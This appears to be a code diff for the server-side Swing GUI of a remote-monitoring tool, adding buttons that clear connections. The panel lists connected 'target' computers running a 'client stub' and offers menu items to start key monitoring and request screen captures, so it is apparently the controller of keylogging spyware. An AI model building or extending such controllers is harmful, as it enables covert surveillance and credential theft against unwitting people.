@@ -12,6 +12,7 @@ import java.net.UnknownHostException;
 import java.util.ArrayList;
 
 import javax.swing.DefaultListModel;
+import javax.swing.JButton;
 import javax.swing.JList;
 import javax.swing.JMenuItem;
 import javax.swing.JPanel;
@@ -22,9 +23,15 @@ import javax.swing.SwingUtilities;
 import net.PacketHeader;
 
 public class ServerPanel extends JPanel implements ActionListener {
-	
+
+	// Buttons under list
+	protected static final int BUTTON_HEIGHT = 25;
+	private JButton clearDead = new JButton("Clear dead connections");
+	private JButton clearAll = new JButton("Clear all connections");
+
 	// List
 	protected static final int LIST_WIDTH = 350;
+	protected static final int LIST_HEIGHT = ServerFrame.WINDOW_HEIGHT - 15 - (BUTTON_HEIGHT * 2);
 	private DefaultListModel<InetAddress> listModel;
 	private JList<InetAddress> clientList;
 	private JScrollPane clientListScroll;
@@ -32,65 +39,72 @@ public class ServerPanel extends JPanel implements ActionListener {
 	// Popup menu
 	private JPopupMenu popupMenu;
 	private JMenuItem menuKeyl, menuPict, menuKill;
-	
+
 	// Side display panel
 	private SidePanel sidePanel;
-	
+
 	public ServerPanel() throws UnknownHostException {
-		
+
 		// Setup panel settings
 		setPreferredSize(new Dimension(ServerFrame.WINDOW_WIDTH, ServerFrame.WINDOW_HEIGHT));
 		setLayout(null);
-		
+
 		// Creates list components and settings
 		listModel = new DefaultListModel<InetAddress>();
 		clientList = new JList<InetAddress>(listModel);
 		clientList.setCellRenderer(new ClientListRenderer());
 		clientListScroll = new JScrollPane(clientList);
-//		listModel.addElement(InetAddress.getLocalHost());
-		
+		//		listModel.addElement(InetAddress.getLocalHost());
+
 		// Prepares the popup menu for when the user right clicks on an element
 		popupMenu = new JPopupMenu();
 		popupMenu.add(menuKeyl = new JMenuItem("Start key monitoring"));
 		popupMenu.add(menuPict = new JMenuItem("Request screen capture"));
 		popupMenu.add(new JPopupMenu.Separator());
 		popupMenu.add(menuKill = new JMenuItem("Terminate communications"));
-		
+
 		// Adds the side panel
 		sidePanel = new SidePanel(new String[] {"Run the client stub on a target computer to connect!", 
 				"Once connected, right click on any entry in the list to the left to execute various functions",
 				"",
 				"Your internal server IP is " + InetAddress.getLocalHost().getHostAddress() + ", with hostname " + InetAddress.getLocalHost().getHostName(),});
-		
+
 		// Sets up the various action listeners
 		// Right click mouse listener for the right click menu on the client list
 		clientList.addMouseListener(new MouseAdapter() {
 			public void mouseClicked(MouseEvent me) {
-				
+
 				// if right mouse button clicked (or me.isPopupTrigger())
 				if (SwingUtilities.isRightMouseButton(me) && !clientList.isSelectionEmpty())
 					popupMenu.show(clientList, me.getX(), me.getY());
 			}
 		});
+		// Adds the action listeners to the buttons under the list
+		clearDead.addActionListener(this);
+		clearAll.addActionListener(this);
 		// Adds the action listener to menu components
 		menuKeyl.addActionListener(this);
 		menuPict.addActionListener(this);
 		menuKill.addActionListener(this);
-		
+
 		// Adds all the components
-		clientListScroll.setBounds(15, 15, LIST_WIDTH, ServerFrame.WINDOW_HEIGHT - 15);
+		clientListScroll.setBounds(15, 15, LIST_WIDTH, LIST_HEIGHT);
+		clearDead.setBounds(15, 15 + LIST_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
+		clearAll.setBounds(15, 15 + LIST_HEIGHT + BUTTON_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
 		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (45 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
 		add(clientListScroll);
+		add(clearDead);
+		add(clearAll);
 		add(sidePanel);
 	}
-	
+
 	/**
 	 * Updates the list of connected clients
 	 */
 	public void updateList() {
 		// Gets list of connected clients
 		ArrayList<InetAddress> connections = RemoteMonitorServer.getConnectionList();
-		
+
 		// Removes all elements in current list, then adds current connections to it
 		listModel.clear();
 		for (int i = 0; i < connections.size(); i++)
@@ -101,20 +115,25 @@ public class ServerPanel extends JPanel implements ActionListener {
 	public void actionPerformed(ActionEvent e) {
 
 		// Sends the appropriate request depending on what element of the popup the user selected
+		// Also I totally get that this is super lazy it works delicously so I'm not too fazed
 		if (e.getSource() == menuKeyl)
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KEYL);
 		else if (e.getSource() == menuPict)
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.PICT);
 		else if (e.getSource() == menuKill)
 			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KILL);
-	}
-	
-//	private void paintComponent(Graphics g) {
-//		super.paintComponent(g);
-//		g.setColor(Color.GRAY);
-//		g.drawLine(14, 14, 15 + LIST_WIDTH, 14);
-//		g.drawLine(14, 14, 14, ServerFrame.WINDOW_HEIGHT);
-//		g.drawLine(15 + LIST_WIDTH, 14, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
-//		g.drawLine(14, ServerFrame.WINDOW_HEIGHT, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
-//	}
+		else if (e.getSource() == clearDead)
+			RemoteMonitorServer.removeDeadConnections();
+		else if (e.getSource() == clearAll)
+			RemoteMonitorServer.removeAllConnections();
+	} 
+
+	//	private void paintComponent(Graphics g) {
+	//		super.paintComponent(g);
+	//		g.setColor(Color.GRAY);
+	//		g.drawLine(14, 14, 15 + LIST_WIDTH, 14);
+	//		g.drawLine(14, 14, 14, ServerFrame.WINDOW_HEIGHT);
+	//		g.drawLine(15 + LIST_WIDTH, 14, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
+	//		g.drawLine(14, ServerFrame.WINDOW_HEIGHT, 15 + LIST_WIDTH, ServerFrame.WINDOW_HEIGHT);
+	//	}
 }
